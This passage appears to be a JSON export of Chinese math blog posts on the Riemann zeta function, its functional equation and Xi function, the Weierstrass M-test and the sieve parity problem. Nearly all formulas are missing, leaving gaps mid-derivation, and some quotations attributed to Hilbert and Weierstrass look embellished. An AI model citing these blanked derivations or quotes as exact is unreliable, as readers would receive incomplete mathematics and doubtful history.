），证明该级数对所有实 快速收敛，这为数值计算零点提供了理论基础。 这种形式为估算零点个数提供了便利，黎曼据此推导出区间 内非平凡零点数量的渐近公式： 历史意义与后续影响 黎曼的解析延拓方法具有划时代意义： 数学框架：首次将复分析系统应用于数论，开创了解析数论这一学科 素数分布：通过 函数零点分布研究素数定理，提出了著名的黎曼假设（所有非平凡零点都位于 直线上） 函数方程：对称性思想启发了模形式、自守函数等后续数学分支的发展 当然，人们希望能找到这一结论的严谨证明，但我经过几次短暂而徒劳的尝试后已经放弃了寻找这种证明的努力，因为这对于我当前的研究目标来说并非必要。 黎曼在论文中坦言，他未能严格证明所有非平凡零点都位于临界线上，这一问题至今仍悬而未决，成为数学史上最著名的未解难题之一。但他的解析延拓方法本身已成为复分析应用的典范，展示了纯粹数学研究如何通过抽象推广揭示自然界的深层规律。 从欧拉乘积到围道积分，从函数方程到 Xi 函数，黎曼的每一步推导都体现了概念的飞跃。这种将特殊函数、复积分与数论问题融合的思维方式，不仅彻底改变了素数研究的面貌，更树立了现代数学中 \"概念先行\" 的研究范式。正如希尔伯特所言：\"如果我沉睡一千年然后醒来，第一个问题会是：黎曼假设被证明了吗？\" 这一问题的根源，正埋藏在黎曼对 函数进行解析延拓的深刻思想之中。"},{"title":"","date":"2025-10-14T06:20:00.000Z","updated":"2025-10-14T06:55:00.000Z","comments":true,"path":"notes/Zeta/52.html","permalink":"https://blog.mhuig.top/notes/Zeta/52","excerpt":"","text":"魏尔斯特拉斯判别法 魏尔斯特拉斯判别法 历史背景与理论渊源19 世纪中期的数学界正经历着一场深刻的变革。尽管微积分已建立近两个世纪，但柯西时代的 \"无限趋近\" 等直观表述仍主导着分析学，导致诸如 \"连续函数必可导\" 等错误认知的流行。正是在这一背景下，魏尔斯特拉斯，这位曾在德国中小城镇中学任教 15 年的 \"现代分析之父\"，通过系统化的严格化工作，彻底重塑了数学分析的基础。 1854 年，魏尔斯特拉斯发表《关于阿贝尔函数理论》，解决椭圆积分逆问题而轰动学界，柯尼斯堡大学因此授予其名誉博士学位。1856 年受聘柏林大学后，他在授课中系统发展了 ε-δ 语言，将极限定义为：\"对任意 ε&gt;0，存在 N 使得当 n &gt; N 时|xₙ-a|&lt;ε\"，这种精确表述彻底取代了牛顿以来的无穷小直观。正是在这一系列严格化工作中，魏尔斯特拉斯于 1860 年代逐步形成了级数一致收敛的概念及其判别准则，其中最具代表性的便是以其名字命名的 M- 判别法。 这一判别法的诞生绝非偶然。当时数学家们正困惑于函数项级数的极限性质，逐项积分、逐项微分的合法性条件亟待明确。魏尔斯特拉斯通过构造控制级数的方法，首次给出了 \"连续函数项级数的一致收敛极限仍连续\" 的严格证明，为后续函数论发展奠定了逻辑基础。1872 年，他正是利用这一工具构造出历史上第一个处处连续但处处不可导的函数： 其中 ， 为奇整数且 。这个 \"病态函数\" 彻底颠覆了当时数学界的认知，而其一致收敛性的证明直接依赖于魏尔斯特拉斯判别法。 定理精确表述与证明框架严格定义魏尔斯特拉斯 M- 判别法（Weierstrass M-test）设函数项级数 在区间 上满足： 一致有界条件：存在与 无关的非负常数 ，使得对所有 及 ，有 ； 控制级数收敛：正项级数 收敛。 则 在 上一致收敛，且绝对收敛。 证明过程根据一致收敛的柯西准则，需证：对任意 ，存在 ，当 时，对所有 有： 证明步骤： 应用控制级数性质：因 收敛，由柯西收敛准则，对上述 ，存在 ，当 时： 估计部分和绝对值：对任意 ，由三角不等式及条件 1： 得出一致收敛结论：上述不等式对所有 成立，即满足一致收敛的柯西条件。 关键注记： 证明中构造的 仅与 有关，与 无关，这正是一致收敛的核心特征； 该判别法同时保证了绝对收敛性，是其区别于阿贝尔判别法、狄利克雷判别法的显著特点； 控制级数 的选取需满足 \" 与 无关 \"和\" 收敛 \" 两个条件，缺一不可。 方法论深度解析与应用技巧控制级数构造策略魏尔斯特拉斯判别法的核心在于寻找不依赖于 的控制项 。实践中常用以下策略： 最大值估计法：对 在区间 上求最大值。例如对 在 上，因 ，故取 ，而 收敛（p- 级数，p = 2 &gt; 1）。 初等不等式法：利用三角函数有界性（如 ）、指数函数性质（如 当 ）等。魏尔斯特拉斯函数证明中正是利用了 ，从而取 ，而 是公比 的收敛等比级数。 逐点估计与上确界：对 在 上，需分段估计： 当 时， （但 发散，需改进）； 更精细估计：当 时 （对 充分大）；当 时 。综合取 ，但需验证 收敛。 与其他判别法的深层比较 判别法 核心思想 优势场景 局限性 魏尔斯特拉斯 M- 判别法 构造收敛的正项控制级数 绝对收敛级数；易求控制项 无法处理条件收敛级数 阿贝尔判别法 通项 = 单调有界 × 一致收敛 交错级数；含单调性条件 需验证函数列单调性 狄利克雷判别法 部分和一致有界 × 通项一致趋于 0 三角级数；周期函数项 需估计部分和界 典型案例：考虑 在 上的收敛性。M- 判别法失效（因 发散），但可用阿贝尔判别法证明其一致收敛，这里体现了不同判别法的互补性。 高维推广与现代拓展魏尔斯特拉斯判别法可自然推广至多元函数项级数。设 在 - 维区域 上，若存在 使 对所有 成立，且 收敛，则级数在 上一致收敛。 在加权逼近理论中，该判别法发展为带权 M- 判别法。例如对多元 Gauss-Weierstrass 算子： 其加权一致收敛性可通过构造带 Jacob i 权的控制级数证明，其中权函数 （ ）。这种推广使得判别法能处理无界区域上的函数逼近问题。 深刻应用与历史影响魏尔斯特拉斯函数的连续性证明魏尔斯特拉斯函数 （其中 ， 为奇整数且 ）的一致收敛性可通过该判别法证明： 每一项 ； 控制级数 收敛（等比级数，公比 ）。 因此，该函数在 上一致收敛且连续。 傅里叶级数收敛性的严格化19 世纪初，傅里叶级数的收敛性问题一直困扰着数学家。魏尔斯特拉斯判别法为此提供了关键工具。对二阶连续可微的周期函数 ，其傅里叶系数满足： 其中 。由于 收敛（p- 级数，p = 2），由魏尔斯特拉斯判别法直接推得傅里叶级数一致收敛于 。这一结果为傅里叶分析奠定了严格基础，使得逐项积分、逐项微分有了坚实的逻辑依据。 函数逼近论的理论基石魏尔斯特拉斯判别法与其逼近定理（1885 年发表）有着深刻联系。后者断言：闭区间上的连续函数可由多项式一致逼近。其概率构造证明（借助 Bernstein 多项式）中，正是通过证明多项式序列的一致收敛性完成的： 尽管原始证明未直接使用 M- 判别法，但其思想一脉相承，通过控制逼近误差来保证一致收敛。现代逼近论中，多元函数逼近的一致收敛性证明，本质上仍是魏尔斯特拉斯控制思想的高维拓展。 数值分析的理论支撑在有限元方法中，分片多项式逼近的收敛性分析依赖于一致收敛理论。考虑定义在区域 上的函数 ，其有限元逼近 满足误差估计： 其中 为网格尺寸， 为多项式次数。证明中需构造一系列满足魏尔斯特拉斯条件的控制级数，以确保当 时逼近误差一致趋于零。 同样，在信号处理中，连续信号的离散化重构（如小波变换）需验证重构级数的一致收敛性。魏尔斯特拉斯判别法提供了判断准则：若小波基函数 满足 且 收敛，则重构级数一致收敛。 历史地位与现代启示魏尔斯特拉斯判别法的历史意义远超一个技术工具的范畴。它标志着数学分析从 \"计算工具\" 向 \"逻辑体系\" 的转变，开创了数学严格化运动的新纪元。魏尔斯特拉斯通过这些严格化工作，将微积分从几何和力学的束缚中解放出来，使其成为独立的逻辑学科。 从现代视角看，这一判别法体现了分析学中 \"控制\" 思想的精髓，通过构造更强的收敛条件（控制级数）来确保所需性质（一致收敛）。这种思想在后续数学发展中不断重现： 在泛函分析中，巴拿赫空间中的一致有界原理（共鸣定理）； 在偏微分方程中，能量估计方法的先验估计技巧； 在概率论中，随机级数的柯尔莫哥洛夫三级数定理。 这些理论虽形式各异，但都延续了魏尔斯特拉斯 \"通过控制保证收敛\" 的核心思想。 值得深思的是，魏尔斯特拉斯发展这些理论时，仍是一位中学教师。在布伦斯堡中学任教期间（1848-1856），他白天教授算术、书法，晚上研究数学，常常工作至凌晨。这种在艰苦条件下追求严格性的精神，或许正是其创立严格分析体系的深层动力。正如他给学生索尼娅・柯瓦列夫斯卡娅的信中所写：\"数学的严谨性，就像道德一样，永远不能妥协。\""},{"title":"","date":"2025-10-16T00:20:00.000Z","updated":"2025-10-16T00:55:00.000Z","comments":true,"path":"notes/Zeta/53.html","permalink":"https://blog.mhuig.top/notes/Zeta/53","excerpt":"","text":"Zeta 函数的函数方程 Zeta 函数的函数方程 历史背景与数学突破1859 年，Bernhard Riemann 在其划时代论文《论小于给定数值的素数个数》中，首次将 Leonhard Euler 于 1737 年定义的实变量级数 （仅在 收敛）延拓为复平面上的解析函数，并揭示了其满足的函数方程。这一发现不仅解决了 函数在全复平面的定义问题，更通过建立 与 之间的对称关系，为素数分布研究提供了复分析这一强大工具。Euler 虽发现了 的乘积公式 连接了正整数与素数，但未能突破实数域的限制；而 Riemann 的函数方程则彻底改变了数论研究的范式，其现代标准形式为： 其中 为 Gamma 函数，表征了 函数在复平面上关于点 的镜像对称。这一方程的深刻性在于，它将 函数的解析性质与数论问题（如素数定理、黎曼猜想）紧密交织，成为 19 世纪数学最辉煌的成就之一。 函数方程的定义与核心意义函数方程本质上是解析延拓的产物，它将 在右半平面（ ）的 Dirichlet 级数定义与左半平面（ ）的性态通过 Gamma 函数、三角函数等超越函数关联起来。其等价形式可写为： 这一关系直接揭示了 函数零点的分布规律： 平凡零点：当 （ ）时， ，此时 ，这些零点分布在负实轴上； 非平凡零点：所有非平凡零点被约束在临界带 内，并关于直线 对称，这正是黎曼猜想的核心断言，即所有非平凡零点均满足 。 函数方程的重要性还体现在其对 函数数值计算的推动：对 的区域，无需直接计算发散的 Dirichlet 级数，而是通过方程转化为 的收敛表达式，显著降低了计算复杂度。 推导方法一：Riemann 围道积分与留数定理（原始证明）Riemann 原始证明的核心思想是通过构造特定围道上的积分，将 表示为被积函数极点留数的和。以下为关键步骤的现代重构： 积分表示的建立 对 ，利用 Gamma 函数的积分定义 ，对 求和可得： Riemann 引入围道 （称为 “黎曼围道”），从正实轴无穷远处出发，绕原点逆时针旋转后返回，避开原点与负实轴上的极点 （ ）。 留数定理的应用 考虑积分 其中 需规定分支割线（通常取负实轴）。由留数定理，该积分等于围道内所有极点 （ ）处留数之和的 倍。计算一阶极点留数： 对 与 分别求和，可得： 利用欧拉公式化简三角函数项 ，结合 Gamma 函数的余元公式 ，最终得到函数方程。 解析延拓的验证 上述推导表明，当 时， 可表为围道积分；通过解析延拓，该表达式对所有 成立，从而证明 在全复平面（除 外）解析。 推导方法二：Poisson 求和公式与 Theta 函数（现代简化方法）Poisson 求和公式 其中 为 的傅里叶变换. 它为函数方程提供了更简洁的证明路径，其核心是通过 Theta 函数建立 与 的联系 Theta 函数的引入 定义 Jacobi Theta 函数 （ ） 其满足函数方程 对 ，考虑函数 ，其傅里叶变换为 代入 Poisson 求和公式可直接验证 Theta 函数的对称性。 的积分表示与变换 对 ，利用 将积分拆分为 两部分。对 部分作变量替换 ，并利用 Theta 函数方程 可得： 等式右侧前两项分别对应 与 的积分表示，合并后即得函数方程的等价形式： 该方法的优势在于避免了复分析中的围道积分技巧，直接通过实分析工具与对称变换得到结果。 推导方法三：组合数学与 Bernoulli 数（特殊值关联）通过组合数学工具（如第二类 Stirling 数与 Bernoulli 数），可建立 在正整数点与负整数点的函数方程关系，这一角度更贴近 Euler 原始工作的延续： Bernoulli 数与 函数的关系 Euler 已证明对正偶数 ， ，其中 为 Bernoulli 数。利用第二类 Stirling 数 的性质（如 ），可推导 （ ）的显式表达式。 函数方程在负整数点的验证 对级数 （ 为整数），利用第二类 Stirling 数的生成函数 与 Bernoulli 数的指数生成函数 可证明对负整数 ，函数方程 成立，这正是 Riemann 函数方程在整数点的特殊情形。例如取 ，有 与通过函数方程计算 完全一致。 应用与拓展：从素数定理到临界线函数方程的深远影响体现在多个数学分支： 素数定理的证明：Hadamard 与 de la Vallée-Poussin 于 1896 年通过证明 在 上无零点（利用函数方程转化为 的情形），首次严格证明了素数定理 。 L- 函数的推广：函数方程的思想被推广至 Dirichlet L- 函数、模形式 L- 函数等更广泛的自守 L- 函数类，形成 Langlands 纲领的核心研究对象。例如 Panchishkin 在文献中研究的 Siegel 模形式 L- 函数，其函数方程包含多个 Gamma 因子乘积，结构虽复杂，但对称本质与 一脉相承。 数值计算与验证：函数方程是计算 在临界带内值的基础。例如对 （黎曼猜想的临界线），通过方程转化为 的收敛级数，结合快速傅里叶变换技术，已验证前 个非平凡零点均满足 。 结语：对称之美与未解之谜黎曼 函数的函数方程不仅是复分析技巧的巅峰，更揭示了数学中深刻的对称性，这种对称不仅是形式上的，更蕴含着数论与分析之间的根本联系。从 Riemann 的原始围道积分，到 Poisson 求和公式的现代简化，再到组合数学的特殊值验证，三种推导方法分别从复分析、实分析、离散数学的角度诠释了同一核心规律。数学中最美的定理往往是那些揭示表面无关对象之间深刻联系的命题，函数方程正是这一理念的典范。 若黎曼猜想得证，函数方程所蕴含的临界线对称性将成为素数分布的终极解释，素数在整数中的不规则出现，竟由复平面上的完美对称所支配, 或许正是数学永恒魅力的缩影。"},{"title":"","date":"2025-10-16T01:20:00.000Z","updated":"2025-10-16T01:55:00.000Z","comments":true,"path":"notes/Zeta/54.html","permalink":"https://blog.mhuig.top/notes/Zeta/54","excerpt":"","text":"Zeta 函数解析延拓的经典方法 Zeta 函数解析延拓的经典方法 黎曼 ζ 函数的解析延拓黎曼 ζ 函数作为解析数论的核心工具，其原始定义 仅在右半平面 收敛。为研究其非平凡零点（如黎曼猜想所关注的 临界线），需通过解析延拓将定义域拓展至全复平面。这里阐述三种经典延拓方法：泊松求和公式法、狄利克雷 η 函数法和围道积分法，揭示其内在联系与数学本质。 一、泊松求和公式与 θ 函数方法1.1 雅可比 θ 函数与函数方程黎曼的突破在于将 ζ 函数与模形式理论关联。定义 θ 函数 由泊松求和公式可得关键对称关系： 此式揭示 θ 函数在 变换下的对称性，为 函数延拓奠定基础。 1.2 ζ 函数的积分表示与解析延拓对 作 Mellin 变换，得到： 将积分拆分为 与 两段，对 段代入式 并换元 ，整理后得到： 右侧积分对所有复 收敛，且在 变换下不变，由此直接导出黎曼函数方程： 该方程将 的 ζ 函数值与 关联，仅需额外处理 的临界带。 二、狄利克雷 η 函数与交错级数延拓2.1 η 函数的定义与收敛性狄利克雷 η 函数 是 ζ 函数的交错形式，其优势在于收敛域更广（ ）。通过简单代数变形可得： 分母 的零点为 ，但分子 η 函数在 的解析性确保式 定义了 内除 外的解析延拓。 2.2 阿贝尔变换与一致收敛性为严格证明 η 函数在 的解析性，对部分和 应用阿贝尔变换： 当 时，余项可通过 的选择被控制，从而证明 η 函数的解析性，进而通过式 将 ζ 函数延拓至 （ 为单极点）。 三、围道积分与 Hurwitz ζ 函数方法3.1 Γ 函数与积分表示利用 Γ 函数的积分定义 ，对 有： 此积分在 收敛，但需通过围道变形延拓至全平面。引入汉克尔围道 （绕负实轴的闭合路径），可将式 改写为： 围道积分的优势在于对所有复 收敛，仅在 处因 Γ 函数极点产生单极点。 3.2 留数定理与函数方程验证被积函数 的极点为 。由留数定理计算围道积分，得到： 化简后重新导出黎曼函数方程 ，验证了围道积分法与 θ 函数法的一致性。 四、延拓结果与奇点分析综合三种方法，ζ 函数的解析延拓具有以下性质： 定义域：全复平面 ，仅在 处有单极点（留数为 1）； 函数方程： ，揭示对称性 ； 特殊值：如 （需注意此为延拓后的值，非原始级数和）。 结语：延拓的深层意义解析延拓不仅是技术手段，更揭示了 ζ 函数的算术本质与模形式、Γ 函数的深刻联系。黎曼通过 θ 函数的模变换性质架起数论与复分析的桥梁，其思想为朗兰兹纲领等现代理论提供范式。"},{"title":"","date":"2025-10-16T01:30:00.000Z","updated":"2025-10-16T01:40:00.000Z","comments":true,"path":"notes/Zeta/55.html","permalink":"https://blog.mhuig.top/notes/Zeta/55","excerpt":"","text":"黎曼 Xi 函数 黎曼 Xi 函数 历史背景与定义起源1859 年，波恩哈德・黎曼在其划时代论文《论小于给定数值的素数个数》中首次引入 Xi 函数，旨在简化黎曼 ζ 函数的解析性质研究。原始定义经后世标准化后，形成两类核心表述： 1. 小写 Xi 函数（ξ(s)） 现代标准定义为： 其中 为黎曼 ζ 函数， 为伽马函数。此定义通过引入多项式因子 和伽马函数项，消除了 在 的极点及平凡零点（负偶数），使 成为整函数（全平面解析）。 2. 大写 Xi 函数（Ξ(t)） 为聚焦临界线分析，黎曼进一步定义： 其中 为实数。该变换将 的非平凡零点问题转化为 的实零点问题，是黎曼猜想的核心表述载体。 核心解析性质推导1. 对称性（泛函方程） 黎曼通过积分变换证明 ，这一对称性直接由 的泛函方程导出： 两边同乘 即得 的对称性。对 ，此性质表现为 ，即 为实变量 的偶函数。 2. 积分表示与解析延拓 从 的积分形式出发，可推导 的显式积分表达式。对于 ， 结合伽马函数的积分表示 代入 定义得： 其中 为雅可比 θ 函数的余项。通过变量替换 ，可证明该积分在全平面收敛，从而完成 的解析延拓。 3. 幂级数展开 在临界线 附近可展开为幂级数。令 ，则由 的偶函数性（关于 对称），其幂级数仅含偶次项： 其中系数 同上。此展开对数值计算 的零点至关重要。 标准化与应用：从函数构造到黎曼猜想1. 零点对应关系 的零点与 的非平凡零点完全一致，且均位于临界带 内。通过 黎曼猜想等价于 的所有零点均为实数。这一转化将复平面零点问题简化为实函数零点问题，为后续研究奠定基础。 2. 解析工具与研究进展 为证明 的零点实性，发展了多种方法： 傅里叶变换方法： 可表示为正定核的傅里叶余弦变换，如 其中 为雅可比 θ 函数。 多项式逼近：构造序列 一致收敛于 ，通过证明其零点均为实数，结合赫尔维茨定理推断 的零点实性。 整函数理论： 属于拉盖尔 - 波利亚类（LP 类），该类函数的零点均为实数，且满足特定增长条件。 3. 数值验证与未解问题 尽管黎曼猜想尚未被严格证明，但数值计算已验证前 个非平凡零点均位于临界线上。 的标准化形式为这些验证提供了便利：由于 为实值偶函数，其零点搜索可简化为正实轴上的实函数求根问题。 四、总结与展望黎曼 Xi 函数通过对 ζ 函数的标准化处理，将素数分布问题与整函数零点理论深刻关联。其核心价值在于： 对称性： 揭示了临界带两侧零点的镜像关系； 整函数性：消除了 ζ 函数的极点与平凡零点，使复分析工具得以全面应用； 实函数转化： 将黎曼猜想简化为实函数零点问题，为解析证明与数值验证提供统一框架。 当前研究聚焦于通过傅里叶分析、随机矩阵理论或非对易几何方法攻克黎曼猜想。无论结果如何，Xi 函数作为连接数论与分析的桥梁，已成为现代数学中不可或缺的核心工具。其标准化过程本身也启示我们：复杂问题的本质往往隐藏在恰当的函数变换之后。"},{"title":"","date":"2025-10-16T08:20:00.000Z","updated":"2025-10-16T08:55:00.000Z","comments":true,"path":"notes/Zeta/57.html","permalink":"https://blog.mhuig.top/notes/Zeta/57","excerpt":"","text":"黎曼的整体思路 黎曼的整体思路 历史背景与研究动机1859 年，32 岁的黎曼被任命为柏林科学院通讯院士，作为回应，他提交了唯一一篇数论论文《论小于给定数值的素数个数》。以欧拉 1737 年发现的乘积公式为起点，将素数分布问题从初等数论推向复分析的新领域，奠定了解析数论的理论基础。黎曼的突破源于一个深刻洞见：素数的离散分布规律，可以通过复平面上某个特殊函数的解析性质来刻画，这个函数后来被称为黎曼 ζ 函数。 当时，高斯与狄利克雷已观察到素数计数函数 （表示小于 x 的素数个数）的渐近行为近似于 ，但都停留在统计层面未能给出严格证明。 黎曼则直接构造了 的精确表达式，其关键创新在于将素数问题转化为复变函数的零点分布问题，这一思想被希尔伯特称为 \"数学中最美丽的成果之一\"。 ζ 函数的定义与解析延拓欧拉乘积与初始定义黎曼以欧拉恒等式作为研究起点：对于实部 的复数 ， 函数可表示为两种等价形式： 级数形式（Dirichlet 级数）： 乘积形式（Euler 乘积）： 这两个表达式仅在 时收敛，黎曼的首要任务是将 解析延拓到整个复平面，使其成为单值亚纯函数。 积分表示形式的构建黎曼利用伽马函数的积分定义 通过变量替换得到： 对 求和后交换积分与求和次序（ 时收敛），得到： 这一积分表示是延拓的基础，但仍局限于右半平面。 围道积分与解析延拓黎曼通过构造围道积分实现解析延拓。考虑复积分： 其中积分路径 C 沿正向围绕原点，避开被积函数的奇点（ ， 为整数）。利用留数定理计算此积分，黎曼得到了 的积分表示： 该表达式对所有有限复数 （除 外）均成立，揭示了 是亚纯函数，在 处有一阶极点，留数为 。 函数方程与零点分布黎曼函数方程通过研究 函数的变换性质（雅可比恒等式），黎曼推导出 函数的函数方程，建立了 与 之间的对称关系： 这一方程具有深刻意义： 零点对称性：若 是零点，则 也是零点； 平凡零点：当 时， ，这些零点称为 \"平凡零点\"； 非平凡零点：所有其他零点位于临界带 内。 Xi 函数的构建为便于研究零点分布，聚焦非平凡零点（位于临界带 ），黎曼定义了辅助函数 ： 即： 该函数具有三个关键性质：整函数（无极点）、实值性（ 为实数）、零点与 的非平凡零点一一对应（ ）。其对称性 表明零点关于实轴对称. 黎曼证明 可展开为快速收敛的级数，为零点数值计算提供了工具。 零点分布猜想与素数公式黎曼在论文中提出三个关于 零点分布的命题，最强的一个断言： 方程 的根有无穷多个，全为实根 这一未经证明的命题，即后世所称的黎曼猜想（Riemann Hypothesis, RH），其现代表述为： 的所有非平凡零点均满足 （临界线）。黎曼坦言自己 “暂未找到严格证明”，但通过数值计算验证了少量零点，认为该命题 “对研究目标并非必需” 而搁置。 素数分布的精确公式阶梯函数 J (x) 的引入黎曼避开直接研究 ，转而定义辅助函数 （称为 \"黎曼素数计数函数\"）： 其中 为传统素数计数函数。 在素数 的 次方处跳跃增加 ,例如 这一构造将离散的素数分布转化为连续可分析的阶梯函数。 从 ζ 函数到素数分布的桥梁黎曼证明 可通过 函数的梅林反演表示为： 该积分称为 \"黎曼素数计数积分\"，通过围道积分计算可展开为： 其中 为对数积分函数， 遍历 的非平凡零点。这一公式首次将素数分布与 函数零点联系起来，余项的振荡行为完全由非平凡零点决定。 这一公式将素数计数函数表示为光滑部分（ ）与零点贡献（ ）之和，后者正是素数分布 “起伏” 的来源。 特别地，若 RH 成立，则零点项可简化为 ，大幅降低估计误差。其中 为非平凡零点虚部，为正实数。 从 J (x) 到 π(x) 的反演通过默比乌斯反演，黎曼从 恢复出 ： 其中 为默比乌斯函数： 若若为个不同素数之积若含有平方因子 这一反演公式表明，只要掌握 的解析性质，就能精确计算素数分布。 最终结果素数计数函数精确公式的最终结果： 其中 为对数积分函数， 遍历 的非平凡零点。 即： 若若为个不同素数之积若含有平方因子 如果黎曼猜想成立，则有进一步： 其中 遍历上半平面非平凡零点的虚部，为正实数，对应复平面上关于实轴对称的成对零点。 核心方法论与历史影响解析数论的范式转移黎曼的研究方法具有革命性： 复分析工具引入：将实变量函数延拓到复平面，利用解析函数的零点、极点、留数等性质研究数论问题； 整体 - 局部关联：通过 函数的整体解析性质（函数方程）推导素数的局部分布规律； 定量估计思想：不仅关注渐近行为，还通过零点分布控制余项大小。 后续发展与未解决问题黎曼的工作为 20 世纪解析数论指明了方向： 1896 年，阿达马与瓦莱 - 普桑利用 证明了素数定理： ； 1905 年，曼戈尔特证明了黎曼关于零点计数函数 的渐近公式： ； 与 的对称关系揭示了算术函数背后的深刻结构，为后续模形式、L 函数的研究提供范本。西格尔 1932 年从黎曼遗稿中发掘的 函数积分表示，进一步推动了临界线零点的计算。 RH 若成立，将蕴含素数分布的最佳误差估计 并解决数论中大量悬而未决的问题。 截至 2024 年，已验证前 个零点均位于临界线，但严格证明仍未完成。 黎曼在论文中坦言：\"当然，人们希望能找到这一结论的严谨证明，但我经过几次短暂而徒劳的尝试后已经放弃了寻找这种证明的努力，因为这对于我当前的研究目标来说并非必要。\" 这种 \"战略性放弃\" 恰恰体现了他的洞察力，优先建立整体理论框架，而非纠结于单一猜想的证明。 结语黎曼 1859 年的论文展现了数学不同分支的深刻联系：复分析为理解数论问题提供了强大工具，而素数分布的奥秘又反过来推动复变函数论的发展。正如希尔伯特所言：\"谁若能解决黎曼猜想，谁就能看清我们这门科学中最神秘的许多篇章。\""},{"title":"","date":"2025-10-16T23:20:00.000Z","updated":"2025-10-16T23:55:00.000Z","comments":true,"path":"notes/Zeta/58.html","permalink":"https://blog.mhuig.top/notes/Zeta/58","excerpt":"","text":"筛法的奇偶障碍 筛法的奇偶障碍 筛法作为解析数论的核心工具，其发展始终伴随着对素数分布规律的探索。然而，奇偶障碍（Parity Problem）作为筛法理论中最深层次的限制，揭示了传统筛法无法区分素数（含奇数个素因子）与殆素数（含偶数个素因子）的本质缺陷。这一障碍不仅是孪生素数猜想、哥德巴赫猜想等著名问题长期悬而未决的关键原因，也成为推动筛法理论创新的核心动力。 历史背景：从 Brun 筛到 Selberg 筛的困境20 世纪初，Viggo Brun 通过改进埃拉托斯特尼筛法，首次证明了孪生素数倒数和收敛。其核心思想是用有限项莫比乌斯函数和替代完整的容斥原理，构造出筛函数的上下界： 其中 表示 的不同素因子个数。 当 为偶数时， 给出上界； 为奇数时给出下界。 尽管 Brun 筛成功突破了朴素筛法的误差爆炸问题，但其本质仍是对素因子个数的奇偶性进行截断，无法精确控制剩余元素的素因子 parity。 1947 年，Atle Selberg 提出了基于二次型极小化的筛法，将筛函数表示为： 通过优化系数 ，Selberg 筛将误差项从 Brun 筛的 降至多项式级别。在孪生素数问题中，Selberg 筛得到上界： 这与猜想的主项阶一致。然而，正是 Selberg 在 1950 年代首次系统揭示了筛法的奇偶困境：对于固定的筛级 ，筛函数的主项表达式与素因子个数的奇偶性无关。 数学原理：奇偶障碍的解析表述筛函数的对称结构考虑筛法的标准框架：设 为待筛集合， 为素数集合， 。筛函数定义为： 根据莫比乌斯反演，理想情况下有： 其中 ， ， 为积性函数。 当用 Selberg 筛的二次型逼近时，主项变为： 关键发现是：此主项与 的选取无关（ 控制素因子个数的截断）。例如，当 时筛出素数， 时筛出素数或素数平方，但两者的主项表达式完全相同。这意味着传统筛法无法区分 （奇数个素因子）和 （偶数个素因子）的情况。 对偶问题的解释从函数论角度看，奇偶障碍源于筛函数对素因子奇偶性的对称性。定义 Liouville 函数 （ 为总素因子个数，含重数），则对于任何筛法构造的权重函数 ，均有： 这表明筛法本质上无法分离 （偶数个素因子）和 （奇数个素因子）的元素。2015 年，Matomäki 和 Radziwiłł证明了短区间内 Liouville 函数的均匀分布，进一步印证了这种对称性的普遍性。 孪生素数问题的实例以孪生素数计数函数 为例，其筛函数对应 Selberg 筛给出上界： 但无法证明下界 核心障碍在于：筛出的元素既包含素数对 （每个含 2 个素因子，偶数），也包含伪素数对如 （含 3 个素因子，奇数），传统筛法无法有效剔除后者。 突破方向：从加权筛到多维筛法1. 加权筛法的修正陈景润在证明 \"1 + 2\"（每个充分大偶数可表为素数加殆素数）时，创造性引入加权筛函数： 通过对不同素因子组合赋予差异化权重，部分打破了奇偶对称性。其关键不等式为： 但此类方法仍受限于殆素数的组合结构，无法推广至 \"1 + 1\"。 Tip 陈景润在 1973 年发表的《大偶数表为一个素数及一个不超过两个素数的乘积之和》中，通过加权筛函数建立了 \"1 + 2\" 定理的核心框架。其证明的起点是定义素数计数函数 ，表示使得大偶数 可表为 或 的素数 的个数，其中 均为素数。这一函数的构造直接关联到哥德巴赫猜想的弱化形式，即 \"每个充分大的偶数可表示为一个素数与一个殆素数之和\"。为精确估计 ，陈景润创造性地引入加权筛函数，其完整形式包含主项与余项的精细拆分：为素数其中：第一项 计数 型素数对， 为 Mangoldt 函数（在素数处取值为对数，合数处为 0）；第二项处理 型殆素数情形，通过双重求和遍历素数乘积的所有可能分解； 为余项，需通过复杂的三角和估计控制其阶数不超过主项。这一构造的突破性在于将传统筛法升级为 \"加权筛法\"，通过对不同类型的素数组合赋予差异化权重，有效克服了经典筛法中 \"过筛\" 导致的计数损失。证明的核心挑战在于证明当 时，主项满足：其中 为依赖于 素因子的常数，定义为：这一常数体现了素数分布的局部密度特征，当 为素数时简化为 2. 多维筛法与 GPY 定理2009 年，Goldston-Pintz-Yıldırım（GPY）提出多维筛法，通过同时筛选多个线性形式 ，构造出素数间隙的非平凡下界。其核心思想是引入权重函数： 通过优化参数 和间距 ，GPY 证明了： 2014 年，Maynard 和 Tao 独立改进了 GPY 方法，将素数间隙上界降至 246（在广义 Elliott-Halberstam 猜想下为 6）。尽管这一突破未完全克服奇偶障碍，但通过增加筛函数的维度，间接弱化了 parity 限制。 3. 算术离散调和分析近年来，结合自守形式和遍历理论的新工具为突破奇偶障碍提供了可能。例如，Chowla 猜想断言 Liouville 函数 与 正交： 这一猜想若成立，将暗示素数分布的奇偶不规则性。2018 年，Kaisa Matomäki 等人证明了短区间内 的部分和有界，为攻击此类问题提供了新视角。 结语：未竟的征程筛法的奇偶障碍本质上是组合筛的线性结构与素数 parity 的非线性性质之间的矛盾。从 Brun 到 Selberg 的经典筛法，再到 GPY 和 Maynard-Tao 的现代改进，每一次突破都伴随着对 parity 限制的部分规避，但彻底解决仍需全新思想。大筛法的名字具有误导性，因为它根本不是筛法，而是调和分析的不等式。或许，只有将筛法与自守表示、L- 函数特殊值等更深层的算术结构相结合，才能最终跨越这一障碍。 当前，关于素数间隙的最佳结果 246 与终极目标 2 之间的鸿沟，恰似奇偶障碍的具象化象征。当我们在解析数论的地图上标注出这一障碍时，它既是边界，也是通往新领域的路标，提醒着我们：在数学探索中，最深刻的限制往往孕育着最伟大的突破。"},{"title":"","date":"2025-10-18T04:20:00.000Z","updated":"2025-10-18T04:55:00.000Z","comments":true,"path":"notes/Zeta/59.html","permalink":"https://blog.mhuig.top/notes/Zeta/59","excerpt":"","text":"黎曼非平凡零点计数渐近公式 黎曼非平凡零点计数渐近公式 在解析数论的历史长河中，黎曼 1859 年的论文犹如一座丰碑，不仅提出了著名的黎曼假设，更开创性地给出了非平凡零点计数函数 的渐近公式 这一公式揭示了复平面上零点分布的宏观规律，其思想深度与方法论创新至今仍深刻影响着数学研究。尽管黎曼未给出完整证明，后世数学家通过复分析、留数定理与 Γ 函数性质的综合运用，最终将这一猜想转化为严格的数学定理。 历史背景与关键思想从素数分布到复平面零点黎曼的核心洞察力在于将素数计数函数 与 